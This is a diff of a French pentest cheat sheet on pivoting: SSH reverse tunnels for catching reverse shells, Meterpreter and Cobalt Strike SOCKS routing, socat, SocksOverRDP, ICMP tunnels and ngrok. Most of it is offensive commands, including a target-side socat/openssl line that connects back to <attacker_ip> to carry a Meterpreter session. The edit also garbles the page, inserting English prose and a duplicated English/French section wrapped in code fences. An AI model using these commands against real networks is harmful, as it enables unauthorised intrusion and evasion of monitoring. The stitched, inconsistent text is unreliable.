@@ -14,7 +14,7 @@
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -76,7 +76,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Transfert de port inverse
 
-Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
+Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes via une DMZ vers votre hôte :
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
@@ -85,7 +85,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
-### Tunnel VPN
+### VPN-Tunnel
 
 Vous avez besoin de **root sur les deux appareils** (car vous allez créer de nouvelles interfaces) et la configuration de sshd doit autoriser la connexion en tant que root :\
 `PermitRootLogin yes`\
@@ -108,7 +108,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Vous pouvez **tunneliser** tout le **trafic** vers un **sous-réseau** via **ssh** à travers un hôte.\
+Vous pouvez **tunneliser** tout le **trafic** vers un **sous-réseau** via un hôte en utilisant **ssh**.\
 Par exemple, rediriger tout le trafic allant vers 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) est un protocole de tunneling qui permet de transférer des données à travers un réseau de manière sécurisée. Il peut être utilisé pour contourner les pare-feu, accéder à des ressources restreintes et protéger la confidentialité des données.
+SOCKS (Socket Secure) est un protocole de tunneling qui permet aux utilisateurs de contourner les pare-feu et de masquer leur adresse IP. Il peut être utilisé pour rediriger le trafic à travers un proxy, offrant ainsi une couche supplémentaire de confidentialité et de sécurité.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -140,17 +140,19 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ### Tunneling and Port Forwarding
 
-#### Tunneling
+Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data in an additional layer of security protocols to protect it from being intercepted. Port forwarding, on the other hand, is a technique that allows a computer's port to be accessed from another computer over a network. This can be useful for accessing services or applications running on a remote machine.
 
-Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data in another protocol to create a secure communication channel. This can be useful for bypassing network restrictions or securely accessing resources on a remote network.
+#### Tunneling Techniques
 
-There are several tools available for creating tunnels, such as SSH, VPNs, and proxy servers. Each has its own strengths and weaknesses, so it's important to choose the right tool for the specific use case.
+1. **SSH Tunneling**: Secure Shell (SSH) tunneling is a popular method for creating secure connections. It can be used to encrypt data transferred between a local and a remote machine.
+
+2. **VPN Tunneling**: Virtual Private Network (VPN) tunneling creates a secure connection over a public network. It is commonly used to access private networks from remote locations.
 
 #### Port Forwarding
 
-Port forwarding is a technique used to redirect network traffic from one port to another. It can be helpful for accessing services on a remote machine or for exposing a local server to the internet. Port forwarding can be set up using routers, firewalls, or specialized software.
+Port forwarding allows connections to a specific port on a computer from another computer. It can be used to access services that are not directly accessible due to network configurations. Port forwarding can also be used to expose a local server to the internet securely.
 
-Both tunneling and port forwarding are commonly used in network security and penetration testing to bypass firewalls, access restricted resources, or hide the origin of network traffic. Understanding how to effectively use these techniques can be valuable for both defensive and offensive security operations.
+Both tunneling and port forwarding are essential techniques in networking and cybersecurity, providing secure ways to transfer data and access remote services.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -167,7 +169,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### Proxy SOCKS
 
-Ouvrez un port dans le serveur d'équipe écoutant sur toutes les interfaces qui peuvent être utilisées pour **router le trafic à travers le beacon**.
+Ouvrez un port dans le teamserver écoutant sur toutes les interfaces qui peut être utilisé pour **router le trafic à travers le beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -178,7 +180,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le Serveur d'Équipe et le trafic est envoyé au Serveur d'Équipe et de là à l'hôte:port indiqué.
+Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le serveur d'équipe et le trafic est envoyé au serveur d'équipe et de là à l'hôte:port indiqué.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -187,7 +189,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 {% hint style="warning" %}
-Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le Serveur d'Équipe et le **trafic est envoyé au client Cobalt Strike** (pas au Serveur d'Équipe) et de là à l'hôte:port indiqué.
+Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le Serveur d'Équipe et le **trafic est envoyé au client Cobalt Strike** (pas au Serveur d'Équipe) et de là vers l'hôte:port indiqué.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -267,56 +269,33 @@ socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 ### Meterpreter via SSL Socat
 
-#### Introduction
+#### Meterpreter via SSL Socat
 
-In this section, we will cover how to use Socat to create a secure communication channel for Meterpreter sessions by tunneling traffic over SSL.
+```plaintext
+Socat is a command-line based utility that establishes two bidirectional byte streams and transfers data between them. It can be used to create a secure communication channel between a compromised host and an attacker-controlled system. In this case, we will use Socat to tunnel Meterpreter traffic over SSL to evade detection by network security devices.
 
-#### Prerequisites
+To achieve this, follow these steps:
 
-Before proceeding, make sure you have the necessary tools installed on your system.
+1. Set up a listener on the attacker machine using Socat to listen on a specific port and forward incoming connections to the Meterpreter payload.
+2. Configure the compromised host to establish a connection to the attacker machine through Socat, encrypting the traffic with SSL.
+3. Once the connection is established, the attacker can interact with the compromised host through the Meterpreter session over the encrypted channel.
 
-- **Socat**: A command-line based utility that establishes two bidirectional byte streams and transfers data between them.
-- **OpenSSL**: A robust, commercial-grade, and full-featured toolkit for the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) protocols.
+This technique can help bypass network monitoring and intrusion detection systems that are not inspecting SSL traffic. However, it is essential to use it responsibly and ethically within authorized penetration testing engagements.
+```
 
-#### Steps
+#### Meterpreter via SSL Socat
 
-1. Generate SSL Certificates:
-   - Generate a private key:
-     ```bash
-     openssl genrsa -out server.key 2048
-     ```
-   - Create a certificate signing request (CSR):
-     ```bash
-     openssl req -new -key server.key -out server.csr
-     ```
-   - Generate a self-signed SSL certificate:
-     ```bash
-     openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
-     ```
+```plaintext
+Socat est un utilitaire en ligne de commande qui établit deux flux de données bidirectionnels et transfère des données entre eux. Il peut être utilisé pour créer un canal de communication sécurisé entre un hôte compromis et un système contrôlé par un attaquant. Dans ce cas, nous utiliserons Socat pour tunneliser le trafic de Meterpreter via SSL afin d'éviter la détection par les dispositifs de sécurité réseau.
 
-2. Start Socat Listener:
-   ```bash
-   socat openssl-listen:443,reuseaddr,fork,cert=server.crt,key=server.key tcp-listen:4444,reuseaddr,fork
-   ```
+Pour ce faire, suivez ces étapes :
 
-3. Connect Meterpreter:
-   - On the attacker machine:
-     ```bash
-     msfconsole
-     use exploit/multi/handler
-     set payload windows/meterpreter/reverse_tcp
-     set LHOST <attacker_ip>
-     set LPORT 4444
-     exploit
-     ```
-   - On the target machine:
-     ```bash
-     socat exec:'openssl s_client -quiet -connect <attacker_ip>:443',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:4444
-     ```
+1. Mettez en place un écouteur sur la machine de l'attaquant en utilisant Socat pour écouter sur un port spécifique et rediriger les connexions entrantes vers la charge utile de Meterpreter.
+2. Configurez l'hôte compromis pour établir une connexion à la machine de l'attaquant via Socat, en chiffrant le trafic avec SSL.
+3. Une fois la connexion établie, l'attaquant peut interagir avec l'hôte compromis via la session Meterpreter sur le canal chiffré.
 
-#### Conclusion
-
-By following these steps, you can establish a secure Meterpreter session using Socat and SSL tunneling.
+Cette technique peut aider à contourner la surveillance réseau et les systèmes de détection d'intrusion qui n'inspectent pas le trafic SSL. Cependant, il est essentiel de l'utiliser de manière responsable et éthique dans le cadre d'engagements de tests de pénétration autorisés.
+```
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -384,9 +363,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 Vous devez avoir **un accès RDP sur le système**.\
-Téléchargez :
+Téléchargement :
 
-1. [Binaires SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Canaux Virtuels Dynamiques` (`DVC`) de la fonctionnalité de Service de Bureau à distance de Windows. DVC est responsable du **tunneling des paquets sur la connexion RDP**.
+1. [Binaires SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité de service de bureau à distance de Windows. DVC est responsable du **tunneling des paquets sur la connexion RDP**.
 2. [Binaire Portable Proxifier](https://www.proxifier.com/download/#win-tab)
 
 Chargez **`SocksOverRDP-Plugin.dll`** sur votre ordinateur client comme ceci :
@@ -394,7 +373,7 @@ Chargez **`SocksOverRDP-Plugin.dll`** sur votre ordinateur client comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **se connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le plugin **SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **se connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez et exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -424,7 +403,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Il s'authentifie contre un proxy et lie un port localement qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
-Par exemple, pour rediriger le port 443.
+Par exemple, rediriger le port 443.
 ```
 Username Alice
 Password P@ssw0rd
@@ -495,7 +474,7 @@ Proxychains intercepte l'appel libc `gethostbyname` et tunnelise la requête DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Il est nécessaire d'avoir les droits root dans les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux en utilisant des requêtes echo ICMP.
+Il est nécessaire d'avoir les droits root sur les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux en utilisant des requêtes d'écho ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -520,7 +499,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 **[ngrok](https://ngrok.com/) est un outil pour exposer des solutions à Internet en une seule ligne de commande.**
-*Les URI d'exposition sont du type:* **UID.ngrok.io**
+*Les URI d'exposition ressemblent à:* **UID.ngrok.io**
 
 ### Installation
 
@@ -536,7 +515,7 @@ chmod a+x ./ngrok
 
 **Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Il est également possible d'ajouter une authentification et du TLS, si nécessaire.*
+*Il est également possible d'ajouter une authentification et TLS, si nécessaire.*
 
 #### Tunneling TCP
 ```bash
@@ -551,7 +530,7 @@ chmod a+x ./ngrok
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Interception des appels HTTP
+#### Sniffing HTTP calls
 
 *Utiles pour XSS, SSRF, SSTI ...*
 Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
@@ -587,7 +566,7 @@ addr: file:///tmp/httpbin/
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -601,6 +580,6 @@ addr: file:///tmp/httpbin/
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
